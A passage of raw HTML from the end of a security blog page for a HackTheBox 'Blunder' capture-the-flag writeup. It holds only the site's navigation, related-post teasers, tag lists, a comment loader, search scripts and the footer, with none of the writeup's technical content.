ColdFusionX&u=http://localhost:4000/posts/Blunder-HTB/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox — Blunder Writeup - ColdFusionX&url=http://localhost:4000/posts/Blunder-HTB/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PassageHTB/">HackTheBox — Passage Writeup</a></li><li><a href="/posts/Doctor-HTB/">HackTheBox — Doctor Writeup</a></li><li><a href="/posts/Omni-HTB/">HackTheBox — Omni Writeup</a></li><li><a href="/posts/OpenKeys-HTB/">HackTheBox — OpenKeyS Writeup</a></li><li><a href="/posts/SneakyMailer-HTB/">HackTheBox — SneakyMailer Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/PassageHTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 10, 2021 <i class="unloaded">2021-03-10T12:15:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Passage Writeup</h3><div class="text-muted small"><p> Passage starts off with web enumeration where we discover the website running on a vulnerable instance of CuteNews CMS and exploit it through bypassing Avatar Image Upload functionality to drop ...</p></div></div></a></div><div class="card"> <a href="/posts/Cache-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 16, 2020 <i class="unloaded">2020-10-16T12:20:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Cache Writeup</h3><div class="text-muted small"><p> Cache was a fun box, Initial web enumeration leads us to hardcoded credentials stored inside simple login page which uses client side validation, then discover a new VHost running a vulnerable i...</p></div></div></a></div><div class="card"> <a href="/posts/LaboratoryHTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Apr 23, 2021 <i class="unloaded">2021-04-23T14:40:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Laboratory Writeup</h3><div class="text-muted small"><p> Laboratory starts off with discovering an vulnerable GitLab instance running on the box. We’ll refer an HackerOne report to exploit a CVE associated with it to get Arbitrary file read vulnerabil...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Cache-HTB/" class="btn btn-outline-primary"><p>HackTheBox — Cache Writeup</p></a> <a href="/posts/Dyplesher-HTB/" class="btn btn-outline-primary"><p>HackTheBox — Dyplesher Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//coldfx.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/Blunder-HTB/'; this.page.identifier = '/posts/Blunder-HTB/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ColdFusionX" data-description="Your Support means the World to me !" data-message="Thank you for visiting. Hope you liked my Blog!" data-color="#5F7FFF" data-position="" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ColdFusionX_">Mayank Deshmukh</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.eu/badge/69842"></script></p></div><div class="footer-right"><p class="mb-0"><h4>Realm of Knowledge</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
